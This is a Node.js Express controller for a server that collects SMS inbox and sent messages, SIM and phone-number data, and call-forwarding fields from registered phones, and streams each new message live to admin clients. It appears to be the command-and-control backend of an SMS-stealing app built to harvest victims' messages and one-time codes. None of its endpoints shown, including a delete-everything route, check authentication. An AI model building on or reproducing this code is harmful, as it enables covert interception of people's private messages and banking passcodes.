// controllers/UserController.js
import User from '../models/UserModel.js';
import Sms from '../models/SmsModel.js';
import { normalizeDeviceId } from "../helpers/deviceId.js";
import { makeDeviceDTO, getCounts } from "../helpers/deviceDto.js";

const rateLimitMap = new Map();
const smsDeduplicationMap = new Map();
const RATE_LIMIT_WINDOW = 2000;
const SMS_DEDUPLICATION_WINDOW = 10000;

const cleanupMaps = () => {
  const now = Date.now();
  const rlCut = now - RATE_LIMIT_WINDOW * 10;
  const smsCut = now - SMS_DEDUPLICATION_WINDOW;
  for (const [k, t] of rateLimitMap.entries()) if (t < rlCut) rateLimitMap.delete(k);
  for (const [k, t] of smsDeduplicationMap.entries()) if (t < smsCut) smsDeduplicationMap.delete(k);
};
setInterval(cleanupMaps, 5 * 60 * 1000);

const generateSmsKey = (deviceId, address, body, date) =>
  `${deviceId}:${address}:${body.substring(0, 50)}:${Math.floor(date / 1000)}`;

function hasMeaningfulSims(sims) {
  if (!Array.isArray(sims) || sims.length === 0) return false;
  return sims.some(s => {
    const carrier = (s?.carrier || '').trim();
    const num = (s?.phoneNumber || '').trim();
    return (carrier && carrier !== 'N/A' && carrier.toLowerCase() !== 'unknown') || !!num;
  });
}

export const register = async (req, res) => {
  try {
    let { deviceId, deviceName, battery, online, sims, sms = [], batterySource, simsSource, simInfo } = req.body;

    deviceId = normalizeDeviceId(deviceId);
    if (!deviceId) return res.status(400).json({ error: "Invalid deviceId" });

    const now = Date.now();
    const last = rateLimitMap.get(deviceId);
    if (last && (now - last) < RATE_LIMIT_WINDOW) {
      return res.status(429).json({ error: "Too many requests. Please wait." });
    }
    rateLimitMap.set(deviceId, now);

    const validSmsIds = [];
    let newSmsCount = 0;

    if (Array.isArray(sms) && sms.length > 0) {
      for (const msg of sms) {
        try {
          if (!msg.address || !msg.body || !msg.date) continue;
          const key = generateSmsKey(deviceId, msg.address, msg.body, msg.date);
          if (smsDeduplicationMap.has(key)) continue;
          smsDeduplicationMap.set(key, now);

          const smsDoc = await Sms.findOneAndUpdate(
            { deviceId, address: msg.address, body: msg.body, date: msg.date },
            {
              $setOnInsert: {
                deviceId, address: msg.address, body: msg.body, date: msg.date, type: msg.type || 'inbox'
              }
            },
            { upsert: true, new: true, runValidators: true }
          );

          if (smsDoc) {
            validSmsIds.push(smsDoc._id);
            if (smsDoc.createdAt && smsDoc.createdAt.getTime() > (now - 5000)) newSmsCount++;
          }
        } catch (e) {
          if (e.code !== 11000) console.error("SMS process error:", e);
        }
      }
    }

    const looksLikeRandomId = /^[A-Z0-9]{8,}$/;
    const setOps = { lastSeen: new Date() };

    if (typeof deviceName === 'string') {
      const trimmed = deviceName.trim();
      if (trimmed && !looksLikeRandomId.test(trimmed)) {
        setOps.deviceName = trimmed;
      }
    }

    if (Number.isFinite(battery)) {
      const clamped = Math.max(0, Math.min(100, battery));
      if (batterySource === 'device' || clamped !== 0) setOps.battery = clamped;
    }

    if (typeof online === 'boolean') setOps.online = online;

    if (simsSource === 'device' && Array.isArray(sims) && sims.length > 0) {
      setOps.sims = sims.slice(0, 2);
    }

    // ENHANCED: Handle simInfo field
    if (Array.isArray(simInfo) && simInfo.length > 0) {
      setOps.simInfo = simInfo.slice(0, 2).map(sim => ({
        slot: sim.slot || 0,
        carrier: sim.carrier || 'Unknown',
        phoneNumber: sim.phoneNumber || '',
        countryCode: sim.countryCode || '',
        mcc: sim.mcc || '',
        mnc: sim.mnc || '',
        displayName: sim.displayName || '',
        forwarding: sim.forwarding || '',
        updatedAt: new Date()
      }));
      console.log(`Enhanced SIM info updated for device: ${deviceId}, SIMs:`, setOps.simInfo);
    }

    if (newSmsCount > 0) setOps.lastSmsReceived = new Date();

    const updatedUser = await User.findOneAndUpdate(
      { deviceId },
      {
        $set: setOps,
        $addToSet: { sms: { $each: validSmsIds } },
        $inc: { totalSmsCount: newSmsCount },
        $setOnInsert: { createdAt: new Date() }
      },
      { upsert: true, new: true, runValidators: true, setDefaultsOnInsert: true }
    );

    const counts = await getCounts(Sms, deviceId);
    const dto = makeDeviceDTO(updatedUser, counts);

    // Emit to all connected admin clients
    global.io.emit("device:update", dto);

    // If new SMS was received, emit specific event
    if (newSmsCount > 0) {
      global.io.emit("new-sms", {
        deviceId,
        newSmsCount,
        latestMessage: sms[0] // Send the first message as latest
      });
    }

    return res.json({ success: true, device: dto, newSmsCount });
  } catch (err) {
    console.error("Register error:", err);
    return res.status(500).json({ error: "Server error", details: err.message });
  }
};

export const updateStatus = async (req, res) => {
  try {
    let { deviceId, battery, online, batterySource } = req.body;
    deviceId = normalizeDeviceId(deviceId);
    if (!deviceId) return res.status(400).json({ error: "Invalid deviceId" });

    const setOps = { lastSeen: new Date() };

    if (Number.isFinite(battery)) {
      const clamped = Math.max(0, Math.min(100, battery));
      if (batterySource === 'device' || clamped !== 0) setOps.battery = clamped;
    }
    if (typeof online === 'boolean') setOps.online = online;

    const user = await User.findOneAndUpdate(
      { deviceId },
      { $set: setOps },
      { new: true, runValidators: true }
    );
    if (!user) return res.status(404).json({ error: "Device not found" });

    const counts = await getCounts(Sms, deviceId);
    const dto = makeDeviceDTO(user, counts);
    global.io.emit("device:update", dto);

    res.json({ success: true, device: dto });
  } catch (e) {
    console.error("Update status error:", e);
    res.status(500).json({ error: "Update failed", details: e.message });
  }
};

export const getUsers = async (req, res) => {
  try {
    const users = await User.aggregate([
      { $lookup: { from: 'sms', localField: 'deviceId', foreignField: 'deviceId', as: 'smsData' } },
      {
        $addFields: {
          inbox: { $size: { $filter: { input: '$smsData', as: 's', cond: { $eq: ['$$s.type', 'inbox'] } } } },
          sent: { $size: { $filter: { input: '$smsData', as: 's', cond: { $eq: ['$$s.type', 'sent'] } } } },
        }
      },
      { $sort: { lastSeen: -1 } }
    ]);
    const list = users.map(u => makeDeviceDTO(u, { inbox: u.inbox || 0, sent: u.sent || 0 }));
    res.json({ users: list });
  } catch (e) {
    console.error("Get users error:", e);
    res.status(500).json({ error: "Failed to fetch users" });
  }
};

export const getSmsMessages = async (req, res) => {
  try {
    let { deviceId } = req.params;
    deviceId = normalizeDeviceId(deviceId);
    if (!deviceId) return res.status(400).json({ error: "Invalid deviceId" });

    const { page = 1, limit = 50, type = 'all' } = req.query;
    const filter = { deviceId };
    if (type !== 'all') filter.type = type;

    const skip = (parseInt(page) - 1) * parseInt(limit);
    const [messages, totalCount] = await Promise.all([
      Sms.find(filter).sort({ date: -1 }).skip(skip).limit(parseInt(limit)).lean(),
      Sms.countDocuments(filter)
    ]);

    res.json({
      success: true,
      messages,
      pagination: {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalCount / parseInt(limit)),
        totalMessages: totalCount,
        hasNextPage: skip + messages.length < totalCount,
        hasPrevPage: parseInt(page) > 1
      }
    });
  } catch (e) {
    console.error("Get SMS messages error:", e);
    res.status(500).json({ error: "Failed to fetch SMS messages" });
  }
};

export const getLatestMessages = async (req, res) => {
  try {
    let { deviceId } = req.params;
    deviceId = normalizeDeviceId(deviceId);
    if (!deviceId) return res.status(400).json({ error: "Invalid deviceId" });

    const { since } = req.query;
    const filter = { deviceId };
    if (since) filter.date = { $gt: parseInt(since) };

    const messages = await Sms.find(filter).sort({ date: -1 }).limit(20).lean();
    res.json({
      success: true,
      messages,
      count: messages.length,
      latestTimestamp: messages[0]?.date || null
    });
  } catch (e) {
    console.error("Get latest messages error:", e);
    res.status(500).json({ error: "Failed to fetch latest messages" });
  }
};

export const deleteAll = async (req, res) => {
  try {
    const [userResult, smsResult] = await Promise.all([
      User.deleteMany({}),
      Sms.deleteMany({})
    ]);
    rateLimitMap.clear();
    smsDeduplicationMap.clear();
    res.json({
      success: true,
      message: "All data deleted successfully",
      deletedUsers: userResult.deletedCount,
      deletedSms: smsResult.deletedCount
    });
  } catch (e) {
    console.error("Delete all error:", e);
    res.status(500).json({ error: "Failed to delete data" });
  }
};

export const getUserByDeviceId = async (req, res) => {
  try {
    let { deviceId } = req.params;
    deviceId = normalizeDeviceId(deviceId);

    const user = await User.findOne({ deviceId }).select('deviceId deviceName fullName mobile orderConfirmed online battery lastSeen totalSmsCount lastSmsReceived simInfo callForwardingSettings createdAt updatedAt').lean();
    if (!user) return res.status(404).json({ error: "Device not found" });

    const counts = await getCounts(Sms, deviceId);
    const dto = makeDeviceDTO(user, counts);

    // Ensure fullName and mobile are included in response
    const response = {
      ...dto,
      fullName: user.fullName || '',
      mobile: user.mobile || '',
      orderConfirmed: user.orderConfirmed || false
    };

    console.log('📤 Sending user data:', response); // Debug log
    res.json(response);
  } catch (e) {
    console.error("Get device error:", e);
    res.status(500).json({ error: "Failed to fetch device" });
  }
};


export const updateUserSimInfo = async (req, res) => {
  try {
    const { deviceId, simInfo } = req.body;

    if (!deviceId) {
      return res.status(400).json({ error: "deviceId is required" });
    }

    if (!Array.isArray(simInfo)) {
      return res.status(400).json({ error: "simInfo must be an array" });
    }

    // Validate SIM info structure
    for (const sim of simInfo) {
      if (typeof sim.slot !== 'number') {
        return res.status(400).json({ error: "Each SIM must have a valid slot number" });
      }
    }

    // Update user with SIM info - no duplicate documents created
    const updatedUser = await User.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          simInfo: simInfo.map(sim => ({
            ...sim,
            updatedAt: new Date()
          })),
          lastSeen: new Date()
        }
      },
      {
        upsert: true,
        new: true,
        runValidators: true,
        setDefaultsOnInsert: true
      }
    );

    // Emit real-time update to admin clients
    const counts = await getCounts(Sms, deviceId);
    const dto = makeDeviceDTO(updatedUser, counts);
    global.io.emit("device:update", dto);

    console.log(`SIM info updated for device: ${deviceId}, SIMs: ${simInfo.length}`);

    res.json({
      success: true,
      user: dto,
      message: `Updated SIM info for ${simInfo.length} SIM card(s)`
    });

  } catch (error) {
    console.error("Update SIM info error:", error);
    res.status(500).json({
      error: "Internal server error",
      details: error.message
    });
  }
};

export const healthCheck = async (req, res) => {
  try {
    const [userCount, smsCount] = await Promise.all([
      User.countDocuments(),
      Sms.countDocuments()
    ]);
    res.json({
      success: true,
      status: "healthy",
      data: {
        totalUsers: userCount,
        totalSms: smsCount,
        rateLimitCacheSize: rateLimitMap.size,
        smsDeduplicationCacheSize: smsDeduplicationMap.size
      }
    });
  } catch (e) {
    res.status(500).json({ success: false, status: "unhealthy", error: e.message });
  }
};



